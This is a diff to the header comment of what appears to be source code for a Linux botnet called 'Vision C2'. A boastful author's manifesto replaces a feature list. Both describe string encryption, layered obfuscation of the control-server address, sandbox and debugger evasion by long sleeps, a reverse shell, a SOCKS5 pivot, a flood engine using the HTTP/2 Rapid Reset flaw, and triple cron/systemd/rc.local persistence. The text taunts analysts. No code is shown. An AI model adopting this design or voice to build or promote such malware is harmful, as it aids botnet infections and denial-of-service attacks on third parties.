@@ -6,28 +6,44 @@
 //  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║    ██║     ██╔═══╝
 //   ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║    ╚██████╗███████╗
 //    ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝╚══════╝
+//													
+// ============================================================================
 //
-//  Vision C2 — the most obfuscated linux bot to ever live.
-//
-//  Built different. Runs silent. Dies never.
-//  Multi-layer runtime decryption, anti-analysis, full daemonization,
-//  DNS-over-HTTPS resolution, TLS-pinned comms, and self-healing
-//  persistence that survives anything you throw at it.
-//
-//  If you're reading this, you already lost.
-//
-//  Features:
-//    - AES-128-CTR runtime string decryption (zero plaintext in binary)
-//    - 5-layer obfuscated address resolution (Base64 > XOR > RC4 > sub > MD5)
-//    - Multi-method DNS: DoH TXT > UDP TXT > A record > direct fallback
-//    - Full Unix daemonization (fork, setsid, fd redirect, signal mask)
-//    - Sandbox/VM/debugger detection with 24h+ sleep evasion
-//    - SOCKS5 proxy with auth for pivoting
-//    - L4/L7 flood engine with session-aware HTTP/2 support
-//    - Self-updating with single-instance lock and old-PID reaping
-//    - Cron + systemd + rc.local triple-redundant startup
+//  Listen. I studied the greats. I pulled apart dozens of Mirai variants line by line. I traced
+//  Aisuru/Kimwolf across continents. I watched script kiddies get their C2
+//  address decrypted in a hour by some random blog writer claiming to be a "whitehat".
+//  We can do this different.
 //
 //
+//  Every layer of obfuscation is a middle finger to every analyst who thought they'd have an easy day. 
+//  Every string in this binary is encrypted. AES-128-CTR. Zero plaintext.
+//  You throw it in strings? You get nothing. The address resolution alone is five layers deep — Base64 into XOR
+//  into RC4 into substitution into MD5 verification back through AES. 
+//
+//  It daemonizes like a proper Unix citizen. Fork. Setsid. Redirect every
+//  file descriptor to /dev/null. Mask the signals. Disappear into the
+//  process table like it was never there. And if you're running it in a VM?
+//  In a sandbox? With a debugger attached? It knows. It sleeps for 24-27 hours
+//  and lets you waste your time staring at nothing.
+//
+//  The payload suite is disgusting. Full reverse shell with output capture.
+//  SOCKS5 proxy with auth pivot through the infected host like it's your
+//  personal VPS. L4 and L7 flood engine with session-aware HTTP/2. 
+//  Plus who the hell else has Rapid Reset CVE as a method on thier net?
+//
+//  It locks to a single instance. It reaps old PIDs so
+//  there's never two of it running. And persistence? Triple redundant —
+//  cron, systemd, rc.local. You clean one, two more bring it back. You
+//  clean two, the third is already running.
+//
+//  
+//  You want to understand botnets? Don't read a paper. Build one. Rip the
+//  entire architecture apart and put it back together with your own hands
+//  until every syscall, every socket option, every evasion technique lives
+//  in your muscle memory. That's what this is.
+//
+//
+//                                                        ~ Sin Too Much
 //
 // ============================================================================
 
